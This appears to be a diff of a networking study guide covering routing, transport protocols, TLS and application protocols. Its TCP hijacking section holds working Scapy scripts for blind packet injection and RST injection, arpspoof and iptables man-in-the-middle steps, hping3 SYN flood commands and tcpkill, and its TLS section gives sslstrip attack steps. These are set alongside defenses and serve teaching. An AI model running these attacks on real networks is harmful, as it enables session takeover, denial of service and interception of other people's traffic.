-**MAC in Action (Hop‑to‑Hop)**
-- Destination MAC is **next hop** (default gateway), not final host.
-- Routers rewrite MAC headers at every hop.
-
----
-
-##### **ARP (Address Resolution Protocol)**
-
-**Purpose**
-- Resolves **IP → MAC** on the local network.
-
-**Request → Reply**
-- **Request:** Broadcast to FF:FF:FF:FF:FF:FF asking “Who has $IP_B$?”
-- **Reply:** Unicast response with $MAC_B$.
-
-**Packet Fields (Key)**
-- Hardware type, Protocol type, Hardware length, Protocol length
-- Opcode (1=Request, 2=Reply)
-- Sender/Target MAC and IP fields
-
-**ARP Cache**
-- Stores IP↔MAC mappings temporarily (TTL‑based).
-
----
-
-##### **Collision Domain vs Broadcast Domain**
-
-**Collision Domain**
-- Hub: 1 domain
-- Switch: 1 per port
-- Router: 1 per interface
-
-**Broadcast Domain**
-- Hub: 1 domain
-- Switch: 1 domain (default)
-- Router: 1 per interface
-
-**Summary**
-| Device | Collision Domains | Broadcast Domains |
-| --- | --- | --- |
-| **Hub** | 1 (entire device) | 1 (entire device) |
-| **Switch** | N (1 per port) | 1 (entire device) |
-| **Router** | N (1 per interface) | N (1 per interface) |
-
-**Circle Technique**
-- Collision: circle each switch/router port (hub = one big circle)
-- Broadcast: circle until router boundary
-
----
-
-##### **VLAN (Virtual LAN)**
-
-**Problem**
-- Single switch = one large broadcast domain
-- Separate physical switches = expensive
-
-**Solution**
-- VLANs split a physical switch into multiple **logical broadcast domains**.
-
-**Benefits**
-- Performance (broadcast control)
-- Virtual grouping
-- Security isolation
-- Flexibility & scalability
-- Cost reduction
-
-**Inter‑VLAN Routing**
-- Use router or Layer 3 switch
-- **Trunk link** carries multiple VLANs with **tags**
-
----
-
-**Hardware**
-- Switches (Layer 2)
+**Hardware Summary**
+- Switches
 - Bridges
 - Network Interface Cards
 - Wireless Access Points
@@ -2346,6 +3465,92 @@ Sender must still be transmitting when collision signal returns.
 2. If B is off‑net, A sends the packet to its **default gateway**.
 3. Router reads Dst IP, consults routing table, forwards to next hop.
 4. Packet is re‑framed at each hop until it reaches B’s network.
+
+##### **IP Addressing & Subnetting**
+
+> 📖 *For comprehensive IP addressing and subnetting coverage, see [Section 13.6 Subnetting](#136-subnetting) and [Section 18.3 IP Address Structure](#183-ip-address-structure).*
+
+- **IPv4 Addressing:** Dotted‑decimal notation and binary representation are foundational for subnetting and ACLs.
+- **Private vs Public:** RFC 1918 ranges are non‑routable; public IPs are globally unique.
+- **Subnet Masks & CIDR:** Define network vs host portions; essential for routing and segmentation.
+- **Wildcard Masks:** Inverse masks used in ACLs and route filters.
+- **Host Boundaries:** Network and broadcast addresses define usable host ranges.
+
+**IPv6 Addressing**
+
+> 📖 *For comprehensive IPv6 coverage including address structure, types, scopes, and autoconfiguration, see [Section 14 IPv6](#14-ipv6--next-generation-ip).*
+
+- **Compression:** Double‑colon shorthand, leading zero suppression.
+- **Link‑Local and ULA:** Local‑scope addressing for control traffic and private internal networks.
+- **Multicast:** Replaces broadcast; used for neighbor discovery and service discovery.
+- **Anycast:** Same address on multiple nodes; routing delivers to the nearest instance.
+- **/64 Convention:** Standard prefix length for most LANs to support SLAAC and neighbor discovery.
+
+##### **Routing & Path Selection**
+
+> 📖 *For comprehensive routing coverage including protocols (RIP, OSPF, BGP), algorithms, and routing tables, see [Section 13.11 Routing Basics](#1311-routing-basics) through [Section 13.18 BGP](#1318-bgp-border-gateway-protocol).*
+
+- **Routing Tables:** Store destination prefixes with next hop and metrics.
+- **Static Routing:** Simple and predictable but not adaptive.
+- **Default Route:** Catch‑all for unknown prefixes.
+- **Route Summarization:** Aggregates prefixes to reduce table size.
+- **Longest Prefix Match:** Most specific route wins in forwarding decisions.
+- **Administrative Distance:** Tie‑breaker across protocols; lower AD preferred.
+- **RIB vs FIB:** Routing table vs fast forwarding table used by hardware.
+- **ECMP:** Equal‑cost routes allow load sharing across multiple next hops.
+- **MTU & Fragmentation:** Path MTU affects fragmentation; PMTUD avoids fragmentation by discovering limits.
+
+##### **Dynamic Routing Protocols**
+
+> 📖 *For comprehensive routing protocol coverage, see [Section 13.12 Distance Vector Routing](#1312-distance-vector-routing-dvr), [Section 13.17 OSPF](#1317-ospf-open-shortest-path-first), and [Section 13.18 BGP](#1318-bgp-border-gateway-protocol).*
+
+- **OSPF:** Link‑state protocol using areas and LSAs with SPF calculations.
+- **OSPFv2:** IPv4 version; supports DR/BDR for multi‑access segments.
+- **Router ID:** Stable identifier, often derived from loopback or highest interface IP.
+- **BGP:** Path‑vector protocol for inter‑AS routing with policy control.
+- **EIGRP:** Cisco proprietary hybrid protocol using DUAL algorithm.
+- **RIP:** Distance‑vector protocol with hop‑count metric and limited scale.
+- **Routing Vulnerabilities (Conceptual):** Route injection, spoofing, and misconfiguration can disrupt traffic flows.
+- **Convergence:** The time to reach a stable routing state after changes; faster convergence reduces outages.
+- **BGP Attributes:** Local preference, AS‑path, MED, and next‑hop influence path selection.
+
+##### **First Hop Redundancy Protocols (FHRP)**
+
+- **HSRP:** Active/standby gateway with virtual IP/MAC.
+- **VRRP:** Standards‑based master/backup approach.
+- **GLBP:** Gateway load balancing across multiple routers.
+
+##### **NAT & PAT Mechanics**
+
+> 📖 *For comprehensive NAT coverage including types, benefits, drawbacks, and how it works step-by-step, see [Section 13.9 NAT (Network Address Translation)](#139-nat-network-address-translation).*
+
+- **Static NAT:** One‑to‑one mapping for inbound reachability.
+- **Dynamic NAT:** Pool‑based translation.
+- **PAT:** Many‑to‑one translation with ports.
+- **NAT Traversal:** STUN/TURN and application behavior for peer‑to‑peer traffic.
+- **NAT Vulnerabilities (Conceptual):** Misconfigurations and dual‑stack overlaps can create unintended paths.
+- **Hairpin NAT:** Internal hosts reach a public address that loops back internally; common in SMB setups.
+- **State Tables:** NAT devices track translations; large connection counts can stress memory.
+
+##### **Gateway & Border Security**
+
+- **Default Gateway Role:** Exit point for non‑local traffic.
+- **Gateway Discovery:** DHCP options and routing tables reveal exit points.
+- **ICMP Redirects:** Can indicate misconfigurations or be abused if not filtered.
+- **Firewall Positioning:** DMZ and edge placement create boundary enforcement.
+- **Exit Paths:** Secondary gateways, VPNs, and proxies define alternative egress.
+
+##### **ICMP & Diagnostics**
+
+> 📖 *For detailed ICMP coverage including message types, error reporting, and security considerations, see [Section 13.8 ICMP (Internet Control Message Protocol)](#138-icmp-internet-control-message-protocol).*
+
+- **Ping:** Echo request/response to test reachability.
+- **Traceroute:** TTL‑based path discovery.
+- **ICMP Redirects:** Inform hosts of better routes (often disabled on secure networks).
+- **ICMP Tunneling (Conceptual):** ICMP can be abused for covert channels if unrestricted.
+- **Filtering:** Balanced ICMP policy is essential for diagnostics and security.
+- **ICMPv6 Roles:** Supports NDP, path MTU discovery, and router advertisements; blocking ICMPv6 can break IPv6.
+- **PMTUD:** Path MTU Discovery relies on ICMP; filtering can cause black‑hole MTU issues.
 
 **Packet Switching (Network Layer)**
 
@@ -2575,6 +3780,247 @@ $$
 
 **F) Congestion Control**
 - Reduces sending rate when the network is congested.
+
+##### **TCP Mechanics**
+
+> 📖 *For detailed TCP coverage including segment structure, header format, handshake, state machine, and attack vectors, see the [TCP Protocol](#tcp-protocol) section below.*
+
+- **TCP Header:** Source/destination ports, sequence and acknowledgment numbers, flags, window size, and options.
+- **Flags:** SYN, ACK, FIN, RST, PSH, URG define connection state changes.
+- **Handshake & Teardown:** Establishes and closes connections reliably.
+- **State Machine:** LISTEN, SYN_SENT, SYN_RECEIVED, ESTABLISHED, FIN_WAIT, CLOSE_WAIT, CLOSED.
+- **Window Scaling:** Extends window size for high‑bandwidth paths.
+- **Options:** MSS, SACK, timestamps, scaling.
+- **TIME_WAIT:** Ensures late segments don't corrupt new connections; too many can exhaust ephemeral ports.
+- **Congestion Control (High‑Level):** Slow start, congestion avoidance, and fast recovery shape the sending rate.
+- **Flow Control:** Receiver‑advertised window prevents buffer overflow at the receiver.
+- **RTT & RTO:** Round‑trip time estimates drive retransmission timeouts.
+- **SACK:** Selective acknowledgment helps recover from multiple losses efficiently.
+- **Nagle/Delayed ACKs:** Reduce small packets but can add latency for interactive flows.
+
+##### **UDP Characteristics**
+
+> 📖 *For detailed UDP coverage including header format and use cases, see the [UDP Protocol](#udp-protocol) section below.*
+
+- Lightweight header, no handshake, no reliability.
+- Common in DNS, DHCP, NTP, RTP, and streaming.
+- Vulnerable to amplification misuse at the protocol level (conceptual).
+- **Statelessness:** Reliability, ordering, and recovery are pushed to applications.
+- **Checksum Use:** Optional in IPv4, mandatory in IPv6; protects against payload corruption.
+
+##### **Port & Service Enumeration (Conceptual)**
+
+- Common ports identify standard services. Understanding port exposure helps determine attack surface and firewall posture.
+
+##### **Scanning & Reconnaissance (Conceptual)**
+
+- SYN vs connect scans reveal different responses.
+- FIN/NULL/Xmas/ACK scans infer filtering without full connection.
+- UDP scans rely on ICMP responses and are less deterministic.
+- Timing controls trade stealth for speed.
+
+##### **Transport Layer Abuse Patterns (Conceptual)**
+
+- SYN floods target state tables.
+- Sequence prediction risks session integrity.
+- RST injection can tear down connections.
+- ACK flooding targets bandwidth and device resources.
+
+##### **TCP Session Hijacking & Connection Attacks — Deep Dive**
+
+TCP's reliance on predictable sequence numbers and lack of authentication makes it vulnerable to sophisticated attacks.
+
+**TCP Session Hijacking Overview:**
+
+Session hijacking allows an attacker to take over an established TCP connection between two parties.
+
+```
+Normal TCP Session:
+┌──────────┐          ┌──────────┐
+│  Client  │ <══════> │  Server  │
+│          │  SEQ/ACK │          │
+└──────────┘          └──────────┘
+
+Session Hijacked:
+┌──────────┐          ┌──────────┐          ┌──────────┐
+│  Client  │          │ Attacker │          │  Server  │
+│ (blocked)│    X     │ (MiTM)   │ <══════> │          │
+└──────────┘          └──────────┘          └──────────┘
+                           │
+                    Takes over session
+                    with correct SEQ/ACK
+```
+
+**TCP Sequence Number Prediction:**
+
+To inject packets, attacker must predict or know the sequence number.
+
+```
+TCP Header Sequence Fields:
+┌─────────────────────────────────────────────────────────────────┐
+│  Sequence Number (32 bits) - Position of first byte in segment │
+├─────────────────────────────────────────────────────────────────┤
+│  Acknowledgment Number (32 bits) - Next expected byte          │
+└─────────────────────────────────────────────────────────────────┘
+
+Session State:
+Client → Server: SEQ=1000, ACK=5000
+Server → Client: SEQ=5000, ACK=1100
+Client → Server: SEQ=1100, ACK=5100
+...
+
+Attacker must know:
+1. Source IP and port
+2. Destination IP and port  
+3. Current sequence number (within window)
+4. Current acknowledgment number
+```
+
+**Blind TCP Session Hijacking:**
+
+Without seeing traffic (no MITM), attacker must guess sequence numbers.
+
+```bash
+# Using Scapy to attempt blind injection
+from scapy.all import *
+
+# Attacker doesn't know exact SEQ, tries window guessing
+target_ip = "192.168.1.100"
+target_port = 80
+source_ip = "192.168.1.5"  # Spoofed client IP
+source_port = 12345         # Must match established session
+
+# Try sequence numbers within window (modern systems use ISN randomization)
+for seq in range(estimated_seq - 10000, estimated_seq + 10000, 1000):
+    pkt = IP(src=source_ip, dst=target_ip)/\
+          TCP(sport=source_port, dport=target_port, 
+              seq=seq, ack=estimated_ack, flags="PA")/\
+          "INJECTED DATA"
+    send(pkt)
+```
+
+**Modern Defenses Against Sequence Prediction:**
+- **ISN Randomization:** Initial Sequence Numbers are randomly generated (RFC 6528)
+- **TCP Timestamps:** Add timestamp to validation
+- **Challenge ACK (RFC 5961):** Server sends challenge ACK for off-window segments
+
+**RST Injection Attack:**
+
+Force connection termination by injecting RST packet with correct sequence.
+
+```bash
+# RST injection using Scapy
+from scapy.all import *
+
+def rst_attack(target_ip, target_port, client_ip, client_port, seq):
+    """Inject RST to tear down connection"""
+    rst_pkt = IP(src=client_ip, dst=target_ip)/\
+              TCP(sport=client_port, dport=target_port, 
+                  flags="R", seq=seq)
+    send(rst_pkt, verbose=False)
+
+# For targeted attack, sniff to get correct SEQ
+def sniff_and_rst(pkt):
+    if TCP in pkt and pkt[TCP].dport == 80:
+        print(f"Injecting RST for SEQ: {pkt[TCP].seq}")
+        rst_attack(pkt[IP].dst, pkt[TCP].dport, 
+                  pkt[IP].src, pkt[TCP].sport, 
+                  pkt[TCP].seq + len(pkt[TCP].payload))
+
+sniff(filter="tcp port 80", prn=sniff_and_rst)
+```
+
+**Use Cases for RST Injection:**
+- **DoS:** Tear down victim's connections
+- **Censorship:** (Great Firewall) Inject RST for blocked keywords
+- **Session Disruption:** Force re-authentication
+
+**TCP Hijacking with ARP Spoofing (Full MITM):**
+
+Combined attack for complete session takeover.
+
+```bash
+# Complete TCP hijacking attack flow:
+
+# 1. ARP spoof to become MITM
+sudo arpspoof -i eth0 -t 192.168.1.5 192.168.1.1 &
+sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.5 &
+
+# 2. Enable forwarding (to maintain connectivity)
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# 3. Sniff TCP session to track SEQ/ACK numbers
+# 4. Block original client (with RST or firewall rule)
+iptables -A FORWARD -s 192.168.1.5 -p tcp --dport 80 -j DROP
+
+# 5. Send packets with correct SEQ/ACK as the "client"
+# Now you ARE the client to the server
+```
+
+**TCP Covert Channels:**
+
+Hide data in TCP header fields.
+
+```
+Covert Channel Locations in TCP:
+- ISN (Initial Sequence Number) - 32 bits of covert data per connection
+- Urgent Pointer - 16 bits when URG flag not set
+- Timestamps - 8 bytes per packet
+- Reserved bits - 3 bits
+- Window size manipulation
+
+# Example: ISN covert channel
+# Encode data in Initial Sequence Number
+import struct
+
+secret = b"DATA"
+isn = struct.unpack("!I", secret)[0]  # Convert bytes to 32-bit int
+# Use this ISN when establishing connections
+```
+
+**Tools for TCP Attacks:**
+
+| Tool | Purpose |
+|------|---------|
+| **hping3** | Craft custom TCP packets, RST injection |
+| **Scapy** | Python packet manipulation |
+| **Ettercap** | ARP spoof + session hijacking |
+| **hunt** | Classic TCP session hijacking tool |
+| **Shijack** | TCP session hijacking |
+| **tcpkill** | RST injection to kill connections |
+
+```bash
+# hping3 examples
+# SYN flood
+hping3 -S --flood -V -p 80 target.com
+
+# RST injection
+hping3 -R -s 12345 -p 80 -M 1000 target.com
+
+# Custom packet crafting
+hping3 -S -p 80 -s 12345 -M 1000 -L 5000 target.com
+
+# tcpkill (from dsniff)
+sudo tcpkill -i eth0 host 192.168.1.100
+```
+
+**TCP Attack Defenses:**
+
+| Defense | Description |
+|---------|-------------|
+| **Encryption (TLS)** | Protects payload, attacker sees encrypted data |
+| **VPN/IPsec** | Encrypts entire TCP session |
+| **ISN Randomization** | Makes sequence prediction difficult |
+| **TCP MD5 Signatures** | BGP sessions use MD5 authentication |
+| **RFC 5961 Mitigations** | Challenge ACK for suspicious segments |
+| **ARP Spoofing Defenses** | DAI, static ARP, port security |
+| **Network Segmentation** | Limit attacker's MITM opportunity |
+
+##### **Transport Filtering**
+
+- Stateless vs stateful firewall behavior and how fragmentation or timing can impact detection (conceptual).
+- **Connection Tracking:** Stateful devices maintain session tables that can be stressed under heavy load.
+- **Timeouts:** Idle and half‑open timeouts affect reliability and troubleshooting outcomes.
 
 **Port Numbers:**
 - 16-bit numbers (0-65535)
@@ -2906,6 +4352,227 @@ $$
 - Compress file before download
 - Translate between character sets
 
+##### **SSL/TLS Deep Dive — Critical for Web Security**
+
+TLS (Transport Layer Security) is the cryptographic protocol securing HTTPS, email, VPNs, and most modern network communications. Understanding TLS is essential for security professionals.
+
+**SSL vs TLS History:**
+| Version | Year | Status |
+|---------|------|--------|
+| SSL 1.0 | Never released | Severe flaws |
+| SSL 2.0 | 1995 | **Deprecated** - Insecure |
+| SSL 3.0 | 1996 | **Deprecated** - POODLE vulnerability |
+| TLS 1.0 | 1999 | **Deprecated** - BEAST, POODLE |
+| TLS 1.1 | 2006 | **Deprecated** - Weak ciphers |
+| TLS 1.2 | 2008 | ✅ Widely used, secure with good config |
+| TLS 1.3 | 2018 | ✅ **Recommended** - Fastest, most secure |
+
+**TLS 1.2 Handshake (RSA Key Exchange):**
+```
+Client                                          Server
+   │                                               │
+   │ ──────── ClientHello ───────────────────────> │
+   │          (TLS version, cipher suites,         │
+   │           random, session ID, extensions)     │
+   │                                               │
+   │ <─────── ServerHello ─────────────────────── │
+   │          (chosen cipher, random, session ID)  │
+   │                                               │
+   │ <─────── Certificate ─────────────────────── │
+   │          (server's X.509 certificate chain)   │
+   │                                               │
+   │ <─────── ServerHelloDone ────────────────── │
+   │                                               │
+   │ ──────── ClientKeyExchange ──────────────── > │
+   │          (pre-master secret encrypted         │
+   │           with server's public key)           │
+   │                                               │
+   │ ──────── ChangeCipherSpec ─────────────────> │
+   │                                               │
+   │ ──────── Finished (encrypted) ─────────────> │
+   │                                               │
+   │ <─────── ChangeCipherSpec ────────────────── │
+   │                                               │
+   │ <─────── Finished (encrypted) ─────────────  │
+   │                                               │
+   │ ═══════ Encrypted Application Data ════════  │
+```
+
+**TLS 1.3 Handshake (Faster - 1-RTT):**
+```
+Client                                          Server
+   │                                               │
+   │ ──────── ClientHello ───────────────────────> │
+   │          (key_share, supported_versions,      │
+   │           pre_shared_key if resuming)         │
+   │                                               │
+   │ <─────── ServerHello ─────────────────────── │
+   │          (key_share, selected version)        │
+   │ <─────── EncryptedExtensions ──────────────  │
+   │ <─────── Certificate ─────────────────────── │
+   │ <─────── CertificateVerify ────────────────  │
+   │ <─────── Finished ───────────────────────── │
+   │                                               │
+   │ ──────── Finished ──────────────────────────>│
+   │                                               │
+   │ ═══════ Encrypted Application Data ════════  │
+```
+
+**TLS 1.3 Improvements:**
+- Removed insecure algorithms (RSA key exchange, CBC, SHA-1)
+- 1-RTT handshake (vs 2-RTT in TLS 1.2)
+- 0-RTT resumption (with replay protection caveats)
+- Perfect Forward Secrecy mandatory (ECDHE only)
+- Encrypted handshake (certificate hidden)
+
+**Certificate Chain Validation:**
+```
+┌─────────────────────────────────────────────────────────────┐
+│                    Root CA Certificate                       │
+│              (Pre-installed in browser/OS)                   │
+│                Self-signed, highly trusted                   │
+└─────────────────────────────────────────────────────────────┘
+                              │
+                              │ Signs
+                              ▼
+┌─────────────────────────────────────────────────────────────┐
+│               Intermediate CA Certificate                    │
+│                  (May be multiple levels)                    │
+│                 Signed by Root or upper CA                   │
+└─────────────────────────────────────────────────────────────┘
+                              │
+                              │ Signs
+                              ▼
+┌─────────────────────────────────────────────────────────────┐
+│                 End-Entity Certificate                       │
+│           (The website's actual certificate)                 │
+│         Contains: domain name, public key, validity          │
+│         Signed by: Intermediate CA                           │
+└─────────────────────────────────────────────────────────────┘
+```
+
+**Certificate Validation Steps:**
+1. Check certificate not expired
+2. Check domain name matches (CN or SAN)
+3. Verify signature chain to trusted root
+4. Check revocation (OCSP or CRL)
+5. Verify key usage extensions
+
+**Cipher Suite Breakdown:**
+```
+TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+ │    │     │        │    │     │
+ │    │     │        │    │     └─ Hash for PRF/HMAC
+ │    │     │        │    └─────── Mode (GCM = authenticated)
+ │    │     │        └──────────── Key size (256-bit)
+ │    │     └───────────────────── Encryption algorithm
+ │    └─────────────────────────── Authentication (signature)
+ └──────────────────────────────── Key Exchange (Diffie-Hellman)
+
+TLS 1.3 Cipher Suites (simplified):
+TLS_AES_256_GCM_SHA384        # Key exchange always ECDHE
+TLS_CHACHA20_POLY1305_SHA256  # Good for mobile (no AES-NI)
+TLS_AES_128_GCM_SHA256        # Faster, still secure
+```
+
+**Common TLS Vulnerabilities & Attacks:**
+
+| Attack | CVE | Affects | Mitigation |
+|--------|-----|---------|------------|
+| **POODLE** | CVE-2014-3566 | SSL 3.0 | Disable SSL 3.0 |
+| **BEAST** | CVE-2011-3389 | TLS 1.0 CBC | Use TLS 1.2+, RC4 (deprecated) |
+| **CRIME** | CVE-2012-4929 | TLS compression | Disable compression |
+| **BREACH** | CVE-2013-3587 | HTTP compression | Disable or randomize |
+| **Heartbleed** | CVE-2014-0160 | OpenSSL | Patch OpenSSL |
+| **DROWN** | CVE-2016-0800 | SSLv2 enabled | Disable SSLv2 |
+| **ROBOT** | CVE-2017-13099 | RSA key exchange | Use ECDHE |
+| **LUCKY13** | CVE-2013-0169 | CBC mode | Use GCM mode |
+
+**SSL Stripping Attack (sslstrip):**
+
+Downgrade HTTPS to HTTP by intercepting the redirect.
+
+```
+Normal flow:
+[User] ─http://bank.com─> [Server] ─301 Redirect to https://─> [User] ─https://bank.com─>
+
+With sslstrip (MITM):
+[User] ─http://bank.com─> [Attacker] ─https://bank.com─> [Server]
+         │                     │
+         │   http (plaintext)  │   https (encrypted)
+         └─────────────────────┘
+         Attacker sees all traffic!
+```
+
+```bash
+# SSL Strip attack (requires MITM via ARP spoofing first)
+# 1. Enable IP forwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# 2. Redirect HTTP traffic to sslstrip
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+# 3. Run sslstrip
+sslstrip -l 8080 -w stripped.log
+
+# 4. ARP spoof victim
+arpspoof -i eth0 -t 192.168.1.5 192.168.1.1
+```
+
+**Defense: HSTS (HTTP Strict Transport Security)**
+```
+# Server sends HSTS header:
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+
+# Browser behavior:
+# - Always uses HTTPS for this domain
+# - Refuses to connect over HTTP
+# - HSTS Preload list baked into browsers
+```
+
+**TLS Configuration Testing Tools:**
+```bash
+# testssl.sh (comprehensive)
+./testssl.sh https://example.com
+
+# Checks: Protocols, ciphers, vulnerabilities, certificate
+
+# SSLyze (Python)
+sslyze --regular example.com
+
+# Nmap SSL scripts
+nmap --script ssl-enum-ciphers -p 443 example.com
+nmap --script ssl-heartbleed -p 443 example.com
+
+# OpenSSL (manual)
+openssl s_client -connect example.com:443 -tls1_2
+echo | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -dates
+```
+
+**Secure TLS Configuration (nginx example):**
+```nginx
+ssl_protocols TLSv1.2 TLSv1.3;
+ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;
+ssl_prefer_server_ciphers off;
+ssl_session_timeout 1d;
+ssl_session_cache shared:SSL:10m;
+ssl_session_tickets off;
+ssl_stapling on;
+ssl_stapling_verify on;
+add_header Strict-Transport-Security "max-age=63072000" always;
+```
+
+**Certificate Pinning:**
+Hardcode expected certificate/public key in application to prevent MITM with rogue CA.
+
+```
+# HTTP Public Key Pinning (HPKP) - Deprecated but concept used in apps
+Public-Key-Pins: pin-sha256="base64hash"; max-age=5184000
+
+# Mobile apps: Pin certificate or public key in code
+# Bypass: Frida, Objection, SSL Kill Switch
+```
+
 ---
 
 #### **Layer 7: Application Layer**
@@ -2938,6 +4605,143 @@ $$
 - **Remote Login:** SSH/Telnet
 - **Directory/Name Services:** DNS
 - **Network Management:** SNMP
+
+##### **Deep Expansion: Session, Presentation & Application**
+
+##### **DNS Protocol & Security**
+
+> 📖 *For comprehensive DNS coverage including resolution process, record types, hierarchy, tools, and red team applications, see [Section 19. Domain Name System (DNS)](#19-domain-name-system-dns--the-internets-phonebook).*
+
+- **Record Types:** A, AAAA, MX, CNAME, NS, SOA, TXT, SPF, DKIM, SRV, CAA.
+- **Resolution Process:** Recursive vs iterative queries, caching behavior, TTL impact.
+- **DNSSEC:** Adds authenticity and integrity, not confidentiality.
+- **DoH/DoT:** Encrypt DNS queries; improves privacy but complicates monitoring.
+- **Security Risks (Conceptual):** Cache poisoning, amplification, and exfiltration via query channels.
+- **Operational Hygiene:** Split‑horizon DNS, restricted zone transfers, and query logging reduce exposure.
+- **TTL Strategy:** Short TTLs aid rapid changes; long TTLs reduce resolver load and stabilize responses.
+- **Negative Caching:** NXDOMAIN responses can be cached, affecting troubleshooting and rollout timing.
+- **Transport Behavior:** UDP is default; TCP is used for large responses, zone transfers, and DNSSEC.
+
+##### **DHCP Protocol**
+
+> 📖 *For detailed DHCP coverage including assignment methods and security considerations, see [Section 18.7 IP Address Assignment Methods](#187-ip-address-assignment-methods).*
+
+- **Lease Cycle:** Discover, Offer, Request, ACK.
+- **Options:** Default gateway, DNS servers, domain suffix, lease duration.
+- **Relay Agents:** Forward DHCP across subnets.
+- **Security Risks (Conceptual):** Rogue DHCP servers and starvation attacks; DHCP snooping mitigates.
+- **Lease Strategy:** Short leases support mobility; longer leases reduce churn and DHCP overhead.
+- **Timers (T1/T2):** Renew and rebind intervals define client behavior before lease expiry.
+- **Option 82 (Relay Info):** Adds circuit/location metadata for policy and auditing.
+
+##### **NTP**
+
+- **Stratum Levels:** Define distance from a time source.
+- **Authentication:** Prevents time manipulation which can disrupt logging and authentication.
+
+##### **SNMP**
+
+- **Manager/Agent Model:** Agents expose MIBs; managers query OIDs.
+- **Versions:** v1/v2c use community strings; v3 adds authentication and encryption.
+- **Access Control:** Restrict SNMP to management networks and avoid write access where possible.
+- **Views:** Limit exposed OIDs to reduce information disclosure.
+
+##### **Syslog**
+
+- **Facilities & Severity:** Categorize logs for centralized analysis.
+- **Security Use:** Correlation and incident response depend on reliable logging.
+- **Time Sync:** Accurate timestamps rely on consistent NTP across devices.
+- **Transport:** UDP is common but lossy; TCP/TLS syslog provides reliability and confidentiality.
+
+##### **File Transfer Protocols**
+
+- **FTP:** Clear‑text control and data channels.
+- **TFTP:** Minimal and unauthenticated, used for device bootstrapping.
+- **SFTP/SCP:** Secure alternatives over SSH.
+
+##### **QoS Fundamentals**
+
+> 📝 *Quick reference for QoS concepts. See Layer 2 sections for related CoS/DSCP tagging.*
+
+- **Classification & Marking:** DSCP and CoS identify traffic priorities.
+- **Queueing Models:** FIFO, WFQ, CBWFQ, LLQ.
+- **Policing vs Shaping:** Immediate drops vs buffering to smooth bursts.
+- **PHB:** Per‑hop behavior defines how routers treat traffic.
+- **Trust Boundaries:** Classify and mark traffic at network edges to prevent endpoint remarking.
+- **Congestion Management:** Queue selection and buffer sizing influence latency, jitter, and loss.
+
+##### **Authentication & Identity**
+
+- **Kerberos:** Ticket‑based authentication (TGT/TGS).
+- **LDAP:** Directory queries and user authentication.
+- **RADIUS:** Centralized AAA with shared secrets.
+- **TACACS+:** Cisco AAA with full packet encryption.
+- **OAuth 2.0 / SAML:** Federated identity and token‑based access.
+- **NTLM:** Challenge‑response legacy mechanism.
+
+##### **TLS & Web Security**
+
+- **TLS Handshake:** ClientHello, ServerHello, key exchange, finished.
+- **Certificate Chain:** Root → intermediate → end‑entity; trust validation is critical.
+- **Cipher Suites:** Define key exchange, encryption, and hashing algorithms.
+- **HSTS & Pinning:** Strengthen HTTPS by enforcing strict transport.
+- **Vulnerability Awareness (Conceptual):** Heartbleed, POODLE, BEAST, CRIME.
+- **Certificate Hygiene:** Rotation, revocation (CRL/OCSP), and key management preserve trust.
+- **SNI/ALPN:** Enables virtual hosting and protocol negotiation (e.g., HTTP/2) over TLS.
+- **PFS (Perfect Forward Secrecy):** Ephemeral keys prevent historical decryption if long‑term keys leak.
+- **Session Resumption:** Reduces handshake latency while preserving security properties.
+
+##### **HTTP & Web Architecture**
+
+> 📖 *For detailed HTTP coverage including connection types, message format, caching, and FTP/Email protocols, see the [World Wide Web (WWW) & HTTP](#world-wide-web-www--http) section below.*
+
+- **Methods:** GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD.
+- **Headers:** Host, Authorization, Cookie, User‑Agent, X‑Forwarded‑For.
+- **Status Codes:** 2xx, 3xx, 4xx, 5xx categories.
+- **HTTP/2 & HTTP/3:** Multiplexing and QUIC‑based transport for lower latency.
+- **Caching Layers:** CDNs and reverse proxies reduce latency but must be controlled by cache headers.
+- **State Management:** Sessions, cookies, and tokens must be scoped and protected appropriately.
+- **Idempotency:** Methods like GET/PUT should be safe to retry; POST may not be.
+- **Cookie Flags:** Secure, HttpOnly, and SameSite reduce exposure to interception and CSRF.
+
+##### **Session & Application Security (Conceptual)**
+
+- Session hijacking/fixation, CSRF, SSRF, XXE, injection, and unsafe deserialization are common risk categories in web applications.
+
+##### **VPN & Tunneling**
+
+> 📖 *For detailed VPN and tunneling coverage, see [Section 17.3 Firewall Architectures](#173-firewall-architectures) and VPN-related subsections.*
+
+- **IPsec:** AH/ESP, transport vs tunnel modes.
+- **GRE:** Simple encapsulation without encryption.
+- **OpenVPN/WireGuard:** Modern VPN protocols with different performance and trust models.
+- **Leak Risks (Conceptual):** DNS leaks, IPv6 leaks, and split‑tunnel exposure.
+
+##### **Network Device Management**
+
+- **Console Access:** Out‑of‑band management channel.
+- **Telnet vs SSH:** Encrypted vs clear‑text administrative access.
+- **HTTP/HTTPS Management:** Web GUIs require proper certificate handling.
+- **AAA:** TACACS+ and RADIUS for centralized control.
+- **Privilege Levels:** Role separation and session timeouts.
+
+##### **Wireless LAN Configuration Concepts**
+
+- **WLAN Creation:** SSID profiles and service sets.
+- **Security:** WPA2‑PSK vs WPA2‑Enterprise vs WPA3.
+- **QoS Profiles:** Voice/video/best‑effort differentiation.
+- **VLAN Assignment:** WLAN‑to‑VLAN mapping for segmentation.
+- **FlexConnect:** Branch traffic handling with central policy.
+
+##### **Monitoring & Analysis**
+
+- **Packet Capture:** Full visibility of payloads and headers.
+- **Flow Telemetry:** Summarized traffic metadata for scale.
+- **Proxy Monitoring:** Visibility and policy enforcement.
+- **IDS/IPS:** Signature and behavior‑based detection.
+- **SIEM:** Centralized correlation and alerting.
+- **Baselining:** Establishing normal traffic patterns is essential for anomaly detection.
+- **Retention:** Log retention policies balance forensic value with storage cost.
 
 **Network Architectures**
 
@@ -4072,6 +5876,8 @@ After this section, you'll understand:
 
 ### 13.6 Subnetting
 
+> 📖 *Also see [Section 18.5 Subnetting](#185-subnetting) for VLSM, quick reference cheat sheet, and additional examples.*
+
